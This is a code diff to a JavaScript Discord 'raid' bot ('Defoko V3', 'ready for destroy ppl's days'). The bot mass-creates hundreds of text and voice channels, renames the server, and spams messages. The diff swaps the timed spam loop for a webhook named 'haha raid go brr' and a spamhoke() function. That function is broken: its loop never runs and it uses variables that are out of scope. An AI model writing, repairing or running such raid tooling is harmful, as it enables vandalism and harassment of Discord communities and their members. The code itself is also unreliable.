@@ -2,6 +2,10 @@ const Discord = require("discord.js");
 const client = new Discord.Client();
 const prefix = '$';
 
+function spamhoke(){
+    for(let spame = 0; spame == 500; spame++) webhook.send(`${args.slice(0).join(' ')}`)
+}
+
 client.on("ready", () => { 
     console.log(`ready for destroy ppl's days`)
     console.log(`Defoko V3`)
@@ -21,7 +25,7 @@ client.on("message", async (message) => {
             if(message.guild.channels > 500) return message.channel.send(`too much text channels`)
             let i;
             if(!args.slice(0).join(' ')){ 
-                message.guild.setName('haha admin go grr -ags')
+                message.guild.setName('haha admin go grr -ags and gs')
                 for(i = 0; i < 499; i++){
                     message.guild.createChannel('haha admin go grr', 'text')
                     message.guild.createChannel('haha admin go grr', 'voice')
@@ -65,11 +69,7 @@ client.on("message", async (message) => {
         case "spam":
             message.delete();
             if(!args.slice(0).join(' ')) return message.channel.send('what am i supposed to spam bruhh')
-            let spamx = 0
-            while(spamx < 500){
-                setTimeout(() => {message.channel.send(args.slice(0).join(' '));}, 750);
-                spamx++
-            }
+            message.channel.createWebhook('haha raid go brr').then(webhook => spamhoke());
         break;
     }
 });
